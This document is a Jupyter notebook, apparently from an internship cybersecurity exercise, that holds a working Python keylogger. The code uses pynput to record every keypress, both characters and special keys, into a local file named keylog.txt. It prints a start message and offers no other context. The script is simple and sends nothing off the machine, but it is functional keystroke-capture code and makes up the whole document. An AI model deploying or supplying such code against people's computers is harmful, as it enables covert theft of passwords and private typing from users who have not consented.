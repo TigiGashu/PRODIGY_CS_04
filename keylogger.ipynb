{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c3a65e13-562c-425a-a96d-96dadb8cc9bc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger started. Press Ctrl+C to stop.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "LOG_FILE = \"keylog.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    \"\"\"\n",
    "    Callback function that executes when a key is pressed.\n",
    "\n",
    "    Args:\n",
    "        key: The key pressed.\n",
    "    \"\"\"\n",
    "    try:\n",
    "        with open(LOG_FILE, \"a\") as file:\n",
    "            if hasattr(key, 'char') and key.char is not None:\n",
    "                # Record alphanumeric keys\n",
    "                file.write(key.char)\n",
    "            else:\n",
    "                # Record special keys like space, enter, etc.\n",
    "                file.write(f\"[{key.name}]\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error logging key: {e}\")\n",
    "\n",
    "def main():\n",
    "    print(\"Keylogger started. Press Ctrl+C to stop.\")\n",
    "    with keyboard.Listener(on_press=on_press) as listener:\n",
    "        listener.join()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd4858e6-0af3-455d-acf2-c4ec05ee92f9",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
